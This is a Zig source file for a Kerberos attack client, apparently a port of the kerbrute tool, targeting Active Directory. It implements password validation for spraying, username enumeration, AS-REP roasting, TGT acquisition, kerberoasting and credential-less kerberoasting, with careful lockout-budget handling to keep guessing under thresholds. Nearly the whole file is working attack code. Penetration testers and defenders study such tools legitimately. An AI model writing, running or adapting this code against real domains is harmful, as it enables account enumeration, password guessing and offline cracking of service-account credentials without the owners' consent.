//! High-level Kerberos client: the AS exchanges kerbrute performs.
//!
//!  * `login`        — full pre-authenticated AS-REQ (validate a password).
//!  * `testUsername` — AS-REQ without pre-auth (enumerate users; capture an
//!                     AS-REP-roast hash when pre-auth is not required).
//!
//! Mirrors gokrb5's client AS exchange: a preemptive PA-ENC-TIMESTAMP using the
//! preferred preauth etype, with a retry using the etype/salt the KDC reports
//! in a KDC_ERR_PREAUTH_{REQUIRED,FAILED} error.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Io = std.Io;

const Config = @import("../config/config.zig").Config;
const network = @import("network.zig");
const iana = @import("../iana/constants.zig");
const der = @import("../asn1/der.zig");
const keys = @import("../crypto/keys.zig");
const etype_mod = @import("../crypto/etype.zig");
const EType = etype_mod.EType;
const rng = @import("../crypto/rng.zig");

const PrincipalName = @import("../types/principal_name.zig").PrincipalName;
const EncryptedData = @import("../types/encrypted_data.zig").EncryptedData;
const PAData = @import("../types/pa_data.zig").PAData;
const pa_data = @import("../types/pa_data.zig");
const KrbFlags = @import("../types/kerberos_flags.zig").KrbFlags;
const kdc_req = @import("../messages/kdc_req.zig");
const kdc_rep = @import("../messages/kdc_rep.zig");
const krb_error = @import("../messages/krb_error.zig");
const ticket_mod = @import("../messages/ticket.zig");
const tgs_mod = @import("../messages/tgs.zig");

/// Result of a password validation (`login`).
pub const LoginResult = union(enum) {
    /// AS-REP received and successfully decrypted — credentials are valid.
    valid,
    /// KDC returned a KRB-ERROR (interpret via iana.error_code).
    krb_error: LoginError,
    /// Could not reach any KDC.
    network_error,
    /// Got an AS-REP but could not decrypt it (bad password on a no-pre-auth
    /// account, or salt/etype mismatch).
    decrypt_error,
};

/// A KRB-ERROR from the login path, plus the NTSTATUS Windows attaches in the
/// e-data when it has one. The NTSTATUS is what separates a locked-out account
/// from a merely disabled/expired one — both arrive as KDC_ERR_CLIENT_REVOKED.
pub const LoginError = struct {
    code: i32,
    nt_status: ?u32 = null,
};

/// AS-REP-roast material captured from a no-pre-auth account. OWNED by the
/// caller's allocator; free with `deinit`.
pub const AsRepRoast = struct {
    allocator: Allocator,
    etype: i32,
    cname: []u8,
    crealm: []u8,
    cipher: []u8,

    pub fn deinit(self: AsRepRoast) void {
        self.allocator.free(self.cname);
        self.allocator.free(self.crealm);
        self.allocator.free(self.cipher);
    }
};

/// Outcome of probing one etype for one principal (`probeEtype`).
pub const EtypeStatus = enum { accepted, not_supported, user_unknown, network_error, other };

/// One row of the etype-acceptance matrix.
pub const EtypeProbe = struct {
    etype: i32,
    status: EtypeStatus,
    /// The etype the KDC advertised for the account (PA-ETYPE-INFO2), or the
    /// AS-REP etype for a no-pre-auth account, when known.
    advertised_etype: ?i32 = null,
    krb_code: ?i32 = null,
    no_preauth: bool = false,
};

/// A Ticket-Granting Ticket plus the session key needed to authenticate
/// follow-up TGS requests. OWNED by the caller's allocator; free with `deinit`.
pub const Tgt = struct {
    allocator: Allocator,
    /// The account this TGT belongs to (the AP-REQ cname). OWNED.
    owner: []u8,
    /// Client realm. OWNED.
    crealm: []u8,
    /// Raw TGT bytes (re-embedded in the AP-REQ). OWNED.
    ticket_raw: []u8,
    /// Session key etype and bytes (used to encrypt the Authenticator). OWNED.
    session_etype: i32,
    session_key: []u8,

    pub fn deinit(self: *Tgt) void {
        self.allocator.free(self.owner);
        self.allocator.free(self.crealm);
        self.allocator.free(self.ticket_raw);
        self.allocator.free(self.session_key);
    }
};

/// Result of acquiring a TGT (`getTGT`).
pub const TgtResult = union(enum) {
    ok: Tgt,
    krb_error: i32,
    network_error,
    /// Got an AS-REP but couldn't decrypt it / recover the session key.
    decrypt_error,
};

/// Kerberoast material: a service ticket's encrypted part. OWNED; free with
/// `deinit`. Format as a `$krb5tgs$` hash via util/hash.tgsToHashcat.
pub const RoastTicket = struct {
    allocator: Allocator,
    etype: i32,
    cipher: []u8,
    crealm: []u8,

    pub fn deinit(self: *RoastTicket) void {
        self.allocator.free(self.cipher);
        self.allocator.free(self.crealm);
    }
};

/// Result of a kerberoast TGS request (`kerberoast`).
pub const KerberoastResult = union(enum) {
    ok: RoastTicket,
    krb_error: i32,
    network_error,
    parse_error,
};

/// A KRB-ERROR plus the pre-auth mechanisms the KDC advertised in its e-data
/// (so the caller can flag PKINIT-required / FAST-armored accounts).
pub const KrbErrorInfo = struct {
    code: i32,
    mech: pa_data.PreauthMechanisms = .{},
    /// NTSTATUS from the e-data when Windows supplied one (see LoginError).
    nt_status: ?u32 = null,
};

/// Result of a username enumeration (`testUsername`).
pub const UsernameResult = union(enum) {
    /// User exists and has pre-auth disabled — AS-REP captured for roasting.
    exists_no_preauth: AsRepRoast,
    /// KDC returned a KRB-ERROR (PREAUTH_REQUIRED => exists;
    /// C_PRINCIPAL_UNKNOWN => does not exist). Carries advertised PA mechanisms.
    krb_error: KrbErrorInfo,
    network_error,
};

pub const Client = struct {
    allocator: Allocator,
    io: Io,
    config: *const Config,

    pub fn init(allocator: Allocator, io: Io, config: *const Config) Client {
        return .{ .allocator = allocator, .io = io, .config = config };
    }

    fn kdcOptions() KrbFlags {
        var o = KrbFlags{};
        o.setFlag(iana.flags.renewable_ok); // gokrb5 KDCDefaultOptions = 0x00000010
        return o;
    }

    /// Validate `username`/`password` via a pre-authenticated AS exchange.
    pub fn login(self: Client, username: []const u8, password: []const u8) LoginResult {
        var guesses: u8 = 0;
        return self.loginCounted(username, password, &guesses);
    }

    /// As `login`, but also reports how many PA-ENC-TIMESTAMP password guesses
    /// actually went on the wire for this one logical attempt.
    ///
    /// The caller MUST charge the lockout budget that many increments, because
    /// AD counts every one. It is normally 1, but a corrected retry (wrong
    /// etype/salt guess) makes it 2 — and with `--etype rc4` the preauth etype
    /// deliberately differs from what AD advertises, so the retry fires on
    /// EVERY attempt. Assuming 1 there would under-count the account's real
    /// bad-password total by half and lock accounts the budget promised to
    /// protect. Measuring beats assuming.
    pub fn loginCounted(self: Client, username: []const u8, password: []const u8, guesses: *u8) LoginResult {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        guesses.* = 0;
        return self.loginInner(arena_state.allocator(), username, password, guesses) catch .network_error;
    }

    fn loginInner(self: Client, arena: Allocator, username: []const u8, password: []const u8, guesses: *u8) !LoginResult {
        const realm = self.config.realm;
        const cname_parts = [_][]const u8{username};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &cname_parts };
        const sname_parts = [_][]const u8{ "krbtgt", realm };
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = &sname_parts };
        const nonce = try rng.nonce(self.io);
        const till = self.nowSeconds() + self.config.ticket_lifetime_secs;

        // First attempt: preemptive PA-ENC-TIMESTAMP with the preferred etype
        // and the default principal salt.
        const pa1 = try self.buildPreauth(arena, password, cname, realm, self.config.preferred_preauth_etype, &.{});
        guesses.* += 1; // a password guess is now on the wire; AD may count it
        const resp = try self.exchange(arena, cname, sname, nonce, till, &.{pa1}) orelse return .network_error;

        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = .{ .code = iana.error_code.krb_err_generic } };
            switch (ke.error_code) {
                iana.error_code.kdc_err_preauth_required, iana.error_code.kdc_err_preauth_failed => {
                    // Retry using the etype/salt the KDC advertises in e-data —
                    // but ONLY if that differs from what we just sent.
                    //
                    // LOCKOUT SAFETY: a PA-ENC-TIMESTAMP that already used the
                    // KDC's own etype/salt and still failed pre-auth is a plain
                    // wrong password. Re-sending it is an identical guess that
                    // buys nothing and costs a SECOND badPwdCount — i.e. every
                    // attempt would consume two of the account's lockout budget,
                    // silently halving the effective threshold. (Measured on
                    // Windows AD: one attempt drove badPwdCount 0 -> 2.)
                    // PREAUTH_REQUIRED is different: no password material was
                    // accepted, so that retry is free and always taken.
                    const err_pas = parseEdataPADatas(arena, ke.edata);
                    const forced = ke.error_code == iana.error_code.kdc_err_preauth_required;
                    if (!forced) {
                        const used_salt = try cname.getSalt(arena, realm);
                        if (!advertisesDifferentKey(err_pas, self.config.preferred_preauth_etype, used_salt)) {
                            return .{ .krb_error = .{ .code = ke.error_code, .nt_status = krb_error.extendedNtStatus(ke.edata) } };
                        }
                    }
                    const et2 = etypeFromPADatas(err_pas) orelse self.config.preferred_preauth_etype;
                    const pa2 = try self.buildPreauth(arena, password, cname, realm, et2, err_pas);
                    guesses.* += 1; // second guess for the SAME logical attempt
                    const resp2 = try self.exchange(arena, cname, sname, nonce, till, &.{pa2}) orelse return .network_error;
                    return self.interpretLoginResponse(arena, resp2, password, nonce);
                },
                else => return .{ .krb_error = .{ .code = ke.error_code, .nt_status = krb_error.extendedNtStatus(ke.edata) } },
            }
        }
        return self.interpretLoginResponse(arena, resp, password, nonce);
    }

    fn interpretLoginResponse(self: Client, arena: Allocator, resp: []const u8, password: []const u8, nonce: i32) !LoginResult {
        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = .{ .code = iana.error_code.krb_err_generic } };
            return .{ .krb_error = .{ .code = ke.error_code, .nt_status = krb_error.extendedNtStatus(ke.edata) } };
        }
        if (!kdc_rep.isASRep(resp)) return .decrypt_error;
        var rep = kdc_rep.ASRep.unmarshal(arena, resp) catch return .decrypt_error;
        defer rep.deinit();
        const ok = self.verifyDecrypt(arena, rep, password, nonce) catch return .decrypt_error;
        return if (ok) .valid else .decrypt_error;
    }

    /// Decrypt and verify the AS-REP encrypted part using the password key.
    fn verifyDecrypt(self: Client, arena: Allocator, rep: kdc_rep.ASRep, password: []const u8, nonce: i32) !bool {
        _ = self;
        const et = EType.fromId(rep.enc_part.etype) orelse return false;
        const key = try keys.getKeyFromPassword(arena, password, rep.cname, rep.crealm, rep.enc_part.etype, rep.padata);
        const plain = etype_mod.decryptMessage(arena, et, key, rep.enc_part.cipher, iana.key_usage.as_rep_encpart) catch return false;
        var part = kdc_rep.EncKDCRepPart.unmarshal(arena, plain) catch return false;
        defer part.deinit();
        return part.nonce == nonce;
    }

    /// Enumerate `username` via an AS-REQ without pre-auth.
    pub fn testUsername(self: Client, username: []const u8) UsernameResult {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        return self.testUsernameInner(arena_state.allocator(), username) catch .network_error;
    }

    fn testUsernameInner(self: Client, arena: Allocator, username: []const u8) !UsernameResult {
        const realm = self.config.realm;
        const cname_parts = [_][]const u8{username};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &cname_parts };
        const sname_parts = [_][]const u8{ "krbtgt", realm };
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = &sname_parts };
        const nonce = try rng.nonce(self.io);
        const till = self.nowSeconds() + self.config.ticket_lifetime_secs;

        const resp = try self.exchange(arena, cname, sname, nonce, till, &.{}) orelse return .network_error;

        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = .{ .code = iana.error_code.krb_err_generic } };
            // The PREAUTH_REQUIRED e-data lists the PA mechanisms this account
            // supports — classify PKINIT-required / FAST-armored.
            const mech = pa_data.detectMechanismsFromEdata(arena, ke.edata);
            return .{ .krb_error = .{ .code = ke.error_code, .mech = mech, .nt_status = krb_error.extendedNtStatus(ke.edata) } };
        }
        if (!kdc_rep.isASRep(resp)) return .network_error;
        // Got an AS-REP without pre-auth: user exists and is AS-REP roastable.
        var rep = kdc_rep.ASRep.unmarshal(arena, resp) catch return .network_error;
        defer rep.deinit();
        const cstr = try rep.cname.principalNameString(self.allocator);
        errdefer self.allocator.free(cstr);
        const crealm = try self.allocator.dupe(u8, rep.crealm);
        errdefer self.allocator.free(crealm);
        const cipher = try self.allocator.dupe(u8, rep.enc_part.cipher);
        return .{ .exists_no_preauth = .{
            .allocator = self.allocator,
            .etype = rep.enc_part.etype,
            .cname = cstr,
            .crealm = crealm,
            .cipher = cipher,
        } };
    }

    /// Acquire a TGT for `username`/`password` (a pre-authenticated AS exchange)
    /// and recover the session key — the prerequisite for kerberoasting.
    /// OWNERSHIP: on `.ok`, the caller frees the `Tgt` with `deinit`.
    pub fn getTGT(self: Client, username: []const u8, password: []const u8) TgtResult {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        return self.getTGTInner(arena_state.allocator(), username, password) catch .network_error;
    }

    fn getTGTInner(self: Client, arena: Allocator, username: []const u8, password: []const u8) !TgtResult {
        const realm = self.config.realm;
        const cname_parts = [_][]const u8{username};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &cname_parts };
        const sname_parts = [_][]const u8{ "krbtgt", realm };
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = &sname_parts };
        const nonce = try rng.nonce(self.io);
        const till = self.nowSeconds() + self.config.ticket_lifetime_secs;

        // Preemptive PA-ENC-TIMESTAMP, then retry with the KDC's etype/salt.
        const pa1 = try self.buildPreauth(arena, password, cname, realm, self.config.preferred_preauth_etype, &.{});
        var resp = try self.exchange(arena, cname, sname, nonce, till, &.{pa1}) orelse return .network_error;
        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = iana.error_code.krb_err_generic };
            switch (ke.error_code) {
                iana.error_code.kdc_err_preauth_required, iana.error_code.kdc_err_preauth_failed => {
                    // Same guard as loginInner: only retry when the KDC is
                    // advertising key material we did not already use. A mistyped
                    // password here would otherwise cost the account TWO
                    // badPwdCount increments instead of one, and this path (TGT
                    // acquisition for kerberoasting) is not budget-paced at all.
                    const err_pas = parseEdataPADatas(arena, ke.edata);
                    const forced = ke.error_code == iana.error_code.kdc_err_preauth_required;
                    if (!forced) {
                        const used_salt = try cname.getSalt(arena, realm);
                        if (!advertisesDifferentKey(err_pas, self.config.preferred_preauth_etype, used_salt)) {
                            return .{ .krb_error = ke.error_code };
                        }
                    }
                    const et2 = etypeFromPADatas(err_pas) orelse self.config.preferred_preauth_etype;
                    const pa2 = try self.buildPreauth(arena, password, cname, realm, et2, err_pas);
                    resp = try self.exchange(arena, cname, sname, nonce, till, &.{pa2}) orelse return .network_error;
                },
                else => return .{ .krb_error = ke.error_code },
            }
        }
        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = iana.error_code.krb_err_generic };
            return .{ .krb_error = ke.error_code };
        }
        if (!kdc_rep.isASRep(resp)) return .network_error;

        var rep = kdc_rep.ASRep.unmarshal(arena, resp) catch return .decrypt_error;
        defer rep.deinit();
        if (rep.ticket_raw.len == 0) return .decrypt_error;

        // Decrypt the AS-REP enc-part to recover the session key.
        const et = EType.fromId(rep.enc_part.etype) orelse return .decrypt_error;
        const key = try keys.getKeyFromPassword(arena, password, rep.cname, rep.crealm, rep.enc_part.etype, rep.padata);
        const plain = etype_mod.decryptMessage(arena, et, key, rep.enc_part.cipher, iana.key_usage.as_rep_encpart) catch return .decrypt_error;
        var part = kdc_rep.EncKDCRepPart.unmarshal(arena, plain) catch return .decrypt_error;
        defer part.deinit();
        const sk = part.key orelse return .decrypt_error;

        // Copy the TGT material into caller-owned memory.
        const owner = try self.allocator.dupe(u8, username);
        errdefer self.allocator.free(owner);
        const crealm = try self.allocator.dupe(u8, rep.crealm);
        errdefer self.allocator.free(crealm);
        const tkt = try self.allocator.dupe(u8, rep.ticket_raw);
        errdefer self.allocator.free(tkt);
        const skey = try self.allocator.dupe(u8, sk.key_value);
        errdefer self.allocator.free(skey);
        return .{ .ok = .{
            .allocator = self.allocator,
            .owner = owner,
            .crealm = crealm,
            .ticket_raw = tkt,
            .session_etype = sk.key_type,
            .session_key = skey,
        } };
    }

    /// Request a service ticket for `spn` using `tgt`, and capture its enc-part
    /// (encrypted with the service account's key) for offline cracking.
    /// OWNERSHIP: on `.ok`, the caller frees the `RoastTicket` with `deinit`.
    pub fn kerberoast(self: Client, tgt: Tgt, spn: []const u8) KerberoastResult {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        return self.kerberoastInner(arena_state.allocator(), tgt, spn) catch .network_error;
    }

    fn kerberoastInner(self: Client, arena: Allocator, tgt: Tgt, spn: []const u8) !KerberoastResult {
        const owner_parts = [_][]const u8{tgt.owner};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &owner_parts };
        const now = self.nowSeconds();
        const cusec = self.nowMicrosFraction();
        const nonce = try rng.nonce(self.io);

        // Authenticator, encrypted with the TGT session key (key usage 7).
        const auth_bytes = try tgs_mod.marshalAuthenticator(arena, tgt.crealm, cname, cusec, now);
        const sk_et = EType.fromId(tgt.session_etype) orelse return .parse_error;
        var confounder: [16]u8 = undefined;
        const cz = sk_et.confounderByteSize();
        try rng.bytes(self.io, confounder[0..cz]);
        const enc = try etype_mod.encryptMessageWithConfounder(arena, sk_et, tgt.session_key, auth_bytes, iana.key_usage.tgs_req_pa_tgs_req_ap_req_authenticator, confounder[0..cz]);
        const auth_ed = EncryptedData{ .etype = tgt.session_etype, .cipher = enc };

        // AP-REQ (TGT + Authenticator) wrapped in a PA-TGS-REQ; req-body SName = SPN.
        const ap_req = try tgs_mod.marshalApReq(arena, tgt.ticket_raw, auth_ed);
        const sname_parts = try tgs_mod.splitSpn(arena, spn);
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = sname_parts };
        const tgs_req = try tgs_mod.marshalTGSReq(arena, ap_req, .{
            .kdc_options = kdcOptions(),
            .cname = null,
            .realm = self.config.realm,
            .sname = sname,
            .till_epoch = now + self.config.ticket_lifetime_secs,
            .nonce = nonce,
            .etypes = self.config.default_tkt_etype_ids,
        });

        const resp = network.sendToKDC(self.io, arena, self.config.*, tgs_req) catch return .network_error;
        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = iana.error_code.krb_err_generic };
            return .{ .krb_error = ke.error_code };
        }
        if (!kdc_rep.isTGSRep(resp)) return .parse_error;

        var trep = kdc_rep.TGSRep.unmarshal(arena, resp) catch return .parse_error;
        defer trep.deinit();
        if (trep.ticket_raw.len == 0) return .parse_error;
        var svc = ticket_mod.Ticket.unmarshal(arena, trep.ticket_raw) catch return .parse_error;
        defer svc.deinit();
        if (svc.enc_part.cipher.len == 0) return .parse_error;

        const cipher = try self.allocator.dupe(u8, svc.enc_part.cipher);
        errdefer self.allocator.free(cipher);
        const crealm = try self.allocator.dupe(u8, svc.realm);
        errdefer self.allocator.free(crealm);
        return .{ .ok = .{
            .allocator = self.allocator,
            .etype = svc.enc_part.etype,
            .cipher = cipher,
            .crealm = crealm,
        } };
    }

    /// Credential-less kerberoast (C2): an AS-REQ *without* pre-auth whose SName
    /// is a target service (not krbtgt). If the requesting account has pre-auth
    /// disabled, the KDC returns an AS-REP containing a service ticket whose
    /// enc-part is encrypted with the *service* account's key — roastable with no
    /// password at all. `requester` must be a DONT_REQUIRE_PREAUTH account.
    pub fn kerberoastNoPreauth(self: Client, requester: []const u8, spn: []const u8) KerberoastResult {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        return self.kerberoastNoPreauthInner(arena_state.allocator(), requester, spn) catch .network_error;
    }

    fn kerberoastNoPreauthInner(self: Client, arena: Allocator, requester: []const u8, spn: []const u8) !KerberoastResult {
        const cname_parts = [_][]const u8{requester};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &cname_parts };
        const sname_parts = try tgs_mod.splitSpn(arena, spn);
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = sname_parts };
        const nonce = try rng.nonce(self.io);
        const till = self.nowSeconds() + self.config.ticket_lifetime_secs;

        const resp = try self.exchange(arena, cname, sname, nonce, till, &.{}) orelse return .network_error;
        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .krb_error = iana.error_code.krb_err_generic };
            return .{ .krb_error = ke.error_code };
        }
        if (!kdc_rep.isASRep(resp)) return .parse_error;
        var rep = kdc_rep.ASRep.unmarshal(arena, resp) catch return .parse_error;
        defer rep.deinit();
        if (rep.ticket_raw.len == 0) return .parse_error;
        var svc = ticket_mod.Ticket.unmarshal(arena, rep.ticket_raw) catch return .parse_error;
        defer svc.deinit();
        if (svc.enc_part.cipher.len == 0) return .parse_error;

        const cipher = try self.allocator.dupe(u8, svc.enc_part.cipher);
        errdefer self.allocator.free(cipher);
        const crealm = try self.allocator.dupe(u8, svc.realm);
        errdefer self.allocator.free(crealm);
        return .{ .ok = .{ .allocator = self.allocator, .etype = svc.enc_part.etype, .cipher = cipher, .crealm = crealm } };
    }

    /// Build a PA-ENC-TIMESTAMP PAData using `etype_id` and the salt implied by
    /// `salt_padata` (or the default principal salt). Allocates from `arena`.
    fn buildPreauth(self: Client, arena: Allocator, password: []const u8, cname: PrincipalName, realm: []const u8, etype_id: i32, salt_padata: []const PAData) !PAData {
        const et = EType.fromId(etype_id) orelse return error.UnsupportedEType;
        const key = try keys.getKeyFromPassword(arena, password, cname, realm, etype_id, salt_padata);
        const ts = try pa_data.marshalPAEncTSEnc(arena, self.nowSeconds(), self.nowMicrosFraction());
        var confounder: [16]u8 = undefined;
        const cz = et.confounderByteSize();
        try rng.bytes(self.io, confounder[0..cz]);
        const enc = try etype_mod.encryptMessageWithConfounder(arena, et, key, ts, iana.key_usage.as_req_pa_enc_timestamp, confounder[0..cz]);
        const ed = EncryptedData{ .etype = etype_id, .cipher = enc };
        const ed_bytes = try ed.marshal(arena);
        return .{ .pa_data_type = iana.pa_type.pa_enc_timestamp, .pa_data_value = ed_bytes };
    }

    /// Marshal an AS-REQ and send it; returns reply bytes (arena-owned) or null
    /// on network failure. Uses the config's advertised etype list.
    fn exchange(self: Client, arena: Allocator, cname: PrincipalName, sname: PrincipalName, nonce: i32, till: i64, padata: []const PAData) !?[]u8 {
        return self.exchangeEtypes(arena, cname, sname, nonce, till, padata, self.config.default_tkt_etype_ids);
    }

    /// Like `exchange`, but advertises an explicit etype list (used by the
    /// etype-acceptance probe to offer a single etype at a time).
    fn exchangeEtypes(self: Client, arena: Allocator, cname: PrincipalName, sname: PrincipalName, nonce: i32, till: i64, padata: []const PAData, etypes: []const i32) !?[]u8 {
        const req = try kdc_req.marshalASReq(arena, .{
            .realm = self.config.realm,
            .cname = cname,
            .sname = sname,
            .nonce = nonce,
            .till_epoch = till,
            .etypes = etypes,
            .kdc_options = kdcOptions(),
            .padata = padata,
        });
        return network.sendToKDC(self.io, arena, self.config.*, req) catch null;
    }

    /// Probe whether the KDC will issue a ticket for `username` under a single
    /// `etype_id` — an AS-REQ advertising only that etype, with no pre-auth. The
    /// reply tells us if the etype is accepted (PREAUTH_REQUIRED), unsupported
    /// (KDC_ERR_ETYPE_NOSUPP), or the user is unknown. Builds the accepted-etype
    /// matrix without ever sending a password.
    pub fn probeEtype(self: Client, username: []const u8, etype_id: i32) EtypeProbe {
        var arena_state = std.heap.ArenaAllocator.init(self.allocator);
        defer arena_state.deinit();
        return self.probeEtypeInner(arena_state.allocator(), username, etype_id) catch .{ .etype = etype_id, .status = .network_error };
    }

    fn probeEtypeInner(self: Client, arena: Allocator, username: []const u8, etype_id: i32) !EtypeProbe {
        const realm = self.config.realm;
        const cname_parts = [_][]const u8{username};
        const cname = PrincipalName{ .name_type = iana.name_type.krb_nt_principal, .name_string = &cname_parts };
        const sname_parts = [_][]const u8{ "krbtgt", realm };
        const sname = PrincipalName{ .name_type = iana.name_type.krb_nt_srv_inst, .name_string = &sname_parts };
        const nonce = try rng.nonce(self.io);
        const till = self.nowSeconds() + self.config.ticket_lifetime_secs;
        const etypes = [_]i32{etype_id};

        const resp = try self.exchangeEtypes(arena, cname, sname, nonce, till, &.{}, &etypes) orelse
            return .{ .etype = etype_id, .status = .network_error };

        if (krb_error.isKRBError(resp)) {
            const ke = krb_error.KRBError.unmarshal(resp) catch return .{ .etype = etype_id, .status = .other };
            switch (ke.error_code) {
                iana.error_code.kdc_err_preauth_required, iana.error_code.kdc_err_preauth_failed => {
                    const pas = parseEdataPADatas(arena, ke.edata);
                    return .{ .etype = etype_id, .status = .accepted, .advertised_etype = etypeFromPADatas(pas), .krb_code = ke.error_code };
                },
                iana.error_code.kdc_err_etype_nosupp => return .{ .etype = etype_id, .status = .not_supported, .krb_code = ke.error_code },
                iana.error_code.kdc_err_c_principal_unknown => return .{ .etype = etype_id, .status = .user_unknown, .krb_code = ke.error_code },
                else => return .{ .etype = etype_id, .status = .other, .krb_code = ke.error_code },
            }
        }
        if (kdc_rep.isASRep(resp)) {
            // A no-pre-auth account: accepted, and we learn the actual etype used.
            var rep = kdc_rep.ASRep.unmarshal(arena, resp) catch return .{ .etype = etype_id, .status = .accepted, .no_preauth = true };
            defer rep.deinit();
            return .{ .etype = etype_id, .status = .accepted, .advertised_etype = rep.enc_part.etype, .no_preauth = true };
        }
        return .{ .etype = etype_id, .status = .other };
    }

    fn nowSeconds(self: Client) i64 {
        return Io.Timestamp.now(self.io, .real).toSeconds();
    }

    fn nowMicrosFraction(self: Client) i32 {
        return @intCast(@mod(Io.Timestamp.now(self.io, .real).toMicroseconds(), 1_000_000));
    }
};

/// Parse a KRB-ERROR e-data field as a SEQUENCE OF PA-DATA (arena-allocated).
fn parseEdataPADatas(arena: Allocator, edata: []const u8) []const PAData {
    if (edata.len == 0) return &.{};
    const r = der.read(edata) catch return &.{};
    return pa_data.unmarshalSequence(arena, r.elem) catch &.{};
}

/// Determine the pre-auth etype from PA-DATA (PA-ETYPE-INFO2 / PA-ETYPE-INFO).
fn etypeFromPADatas(pas: []const PAData) ?i32 {
    const info = pa_data.extractSaltInfo(pas) catch return null;
    return info.etype;
}

/// Would re-deriving the pre-auth key from the KDC's advertised ETYPE-INFO2
/// produce DIFFERENT key material than `used_etype` + `used_salt` did?
///
/// This is the guard that keeps one attempt to one bad-password increment: if
/// the KDC is advertising exactly what we already used, a PREAUTH_FAILED means
/// the password is wrong, and retrying only burns another badPwdCount. A KDC
/// that advertises nothing usable (no ETYPE-INFO at all) also yields false —
/// there is nothing new to try.
fn advertisesDifferentKey(pas: []const PAData, used_etype: i32, used_salt: []const u8) bool {
    const info = pa_data.extractSaltInfo(pas) catch return false;
    if (info.etype) |e| {
        if (e != used_etype) return true;
    }
    if (info.salt) |s| {
        if (!std.mem.eql(u8, s, used_salt)) return true;
    }
    // Non-empty s2kparams (e.g. a non-default AES iteration count) change the
    // derived key even when etype and salt match.
    if (info.s2kparams) |p| {
        if (p.len > 0) return true;
    }
    return false;
}

const testing = std.testing;

test "etypeFromPADatas extracts etype from PA-ETYPE-INFO2" {
    const a = testing.allocator;
    // ETYPE-INFO2-ENTRY: SEQUENCE { [0] etype 18, [1] salt "S" }
    const e0 = try der.encodeInt(a, 18);
    defer a.free(e0);
    const f0 = try der.explicit(a, 0, e0);
    defer a.free(f0);
    const s = try der.encodeGeneralString(a, "S");
    defer a.free(s);
    const f1 = try der.explicit(a, 1, s);
    defer a.free(f1);
    const entry = try der.sequence(a, &.{ f0, f1 });
    defer a.free(entry);
    const eti2_seq = try der.sequence(a, &.{entry});
    defer a.free(eti2_seq);

    const pa = PAData{ .pa_data_type = iana.pa_type.pa_etype_info2, .pa_data_value = eti2_seq };
    try testing.expectEqual(@as(?i32, 18), etypeFromPADatas(&.{pa}));
}

/// Build a PA-ETYPE-INFO2 PA-DATA advertising `etype` + `salt`. Caller frees the
/// returned buffer, which the PAData borrows.
fn testEtypeInfo2(a: std.mem.Allocator, etype: i32, salt: []const u8) ![]u8 {
    const e0 = try der.encodeInt(a, etype);
    defer a.free(e0);
    const f0 = try der.explicit(a, 0, e0);
    defer a.free(f0);
    const s = try der.encodeGeneralString(a, salt);
    defer a.free(s);
    const f1 = try der.explicit(a, 1, s);
    defer a.free(f1);
    const entry = try der.sequence(a, &.{ f0, f1 });
    defer a.free(entry);
    return der.sequence(a, &.{entry});
}

// LOCKOUT SAFETY REGRESSION TEST. The bug this guards: kerbrutez retried the
// PA-ENC-TIMESTAMP on every KDC_ERR_PREAUTH_FAILED, so one attempt sent two
// password guesses and AD counted TWO badPwdCount increments (measured live on
// Windows AD: a single attempt drove badPwdCount 0 -> 2). That halves the real
// lockout budget and makes the panic-stop/pacing guarantees wrong. The retry is
// now taken only when the KDC advertises key material we did not already use.
test "advertisesDifferentKey: no retry when the KDC advertises what we already used" {
    const a = testing.allocator;
    const salt = "NORTH.SEVENKINGDOMS.LOCALsamwell.tarly";

    // Same etype + same salt => a genuine bad password. Retrying would re-send
    // an identical guess and cost a second badPwdCount.
    {
        const seq = try testEtypeInfo2(a, 18, salt);
        defer a.free(seq);
        const pa = PAData{ .pa_data_type = iana.pa_type.pa_etype_info2, .pa_data_value = seq };
        try testing.expect(!advertisesDifferentKey(&.{pa}, 18, salt));
    }
    // Different etype (we guessed aes128, KDC wants aes256) => retry is needed.
    {
        const seq = try testEtypeInfo2(a, 18, salt);
        defer a.free(seq);
        const pa = PAData{ .pa_data_type = iana.pa_type.pa_etype_info2, .pa_data_value = seq };
        try testing.expect(advertisesDifferentKey(&.{pa}, 17, salt));
    }
    // Non-default salt (e.g. a renamed/migrated principal) => retry is needed.
    {
        const seq = try testEtypeInfo2(a, 18, "SOMEOTHERSALT");
        defer a.free(seq);
        const pa = PAData{ .pa_data_type = iana.pa_type.pa_etype_info2, .pa_data_value = seq };
        try testing.expect(advertisesDifferentKey(&.{pa}, 18, salt));
    }
    // A KDC that advertises nothing usable: there is nothing new to try, so
    // don't spend another increment.
    try testing.expect(!advertisesDifferentKey(&.{}, 18, salt));
}
